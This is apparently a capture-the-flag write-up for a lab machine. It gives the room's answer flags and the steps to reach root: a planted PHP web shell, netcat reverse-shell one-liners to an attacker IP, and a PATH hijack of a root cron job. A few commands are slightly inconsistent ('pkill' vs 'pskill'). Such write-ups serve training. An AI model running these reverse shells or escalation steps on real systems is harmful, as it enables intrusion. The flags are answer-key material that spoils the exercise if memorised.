# hacker vs hacker
## 10.10.213.219

## Task 1  Get on and boot them out!
+ What is the user.txt flag?`thm{af7e46b68081d4025c5ce10851430617}`
+ What is the proof.txt flag?`thm{7b708e5224f666d3562647816ee2a1d4}`


### Hand On 
+ Enumerate with `nmap -sC -sV 10.10.213.219 ` and `gobuster dir -u http://10.10.213.219 -w directory_wordlist.txt -x .pdf, .php, .html`
    - nmap found 2 port open
    - gobuster find `/uploads.php` , `/cvs` and run gobuster again this folder `gobuster dir -u http://10.10.213.219/cvs/ -w directory_wordlist.txt -x .pdf, .php, .html` and found `shell.pdf.php`

+ After research the payload have some parameter `$_GET['cmd']` and try to use that backdoor with `http://10.10.213.219/cvs/shell.pdf.php?cmd={PAYLOAD}`
+ The payload i use is using:
    - Base64 from `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 1337 >/tmp/f` and  decode it to make a `file.sh`  file
    - Then `chmod 777 file.sh; ./file.sh` 
+ You can try using PHP Reverse Shell decoded to base64 and echoing the decoded to rev.php
+ Then listen to the port 1337 using netcat `nc -lvp 1337` 
+ After got the shell check `.bash_history
```bash
www-data@b2r:/home/lachlan$ cat .bash_history
cat .bash_history
./cve.sh
./cve-patch.sh
vi /etc/cron.d/persistence
echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd
ls -sf /dev/null /home/lachlan/.bash_history
```
+ Look like the hacker change the password using `echo -e "dHY5pzmNYoETv7SUaY\nthisistheway123\nthisistheway123" | passwd` 
+ Try SSH `ssh lachlan@10.10.213.219` and put the password 
+ Ater a few minute look like our session get killed with message `nope` but our shell still live.
+ Thinking about the hacker have a crontab `vi /etc/cron.d/persistence` lets check the file
```bash
$cat /etc/cron.d/persistence
PATH=/home/lachlan/bin:/bin:/usr/bin
# * * * * * root backup.sh
* * * * * root /bin/sleep 1  && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 11 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 21 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 31 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 41 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
* * * * * root /bin/sleep 51 && for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope > /dev/pts/$f && pkill -9 -t pts/$f; done
```
+ Let abuse the `pskill` on that crontab with setup the `PATH` to use `/home/lachlan/bin`
```bash
cd /home/lachlan/bin
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.4.37.160 1234 >/tmp/f" > pkill
chmod +x pskill
export PATH=/home/lachlan/bin:$PATH
```
+ Listen on port 1234 and try ssh to trigger the pts and we got the root shell
+ And now we can stabilize the root shell using 
    - `python3 -c "import pty;pty.spawn('/bin/bash')"`
    - press `CTRL + Z` to make it on background `stty raw -echo;fg;` to make tty remove echoing and to make it on foreground
    - `export TERM=xterm` to make our shell as terminal sessions 
+ After that don't forget to change the crontab using `echo "" > /etc/cron.d/persistence && /etc/init.d/cron reload` 

## Looking for answer 
+ Check user folder or use command find to check.(That's root.txt on /root not `proof.txt`) 
```bash
cat user.txt
thm{af7e46b68081d4025c5ce10851430617}
root@b2r:~# cat root.txt
thm{7b708e5224f666d3562647816ee2a1d4}
```
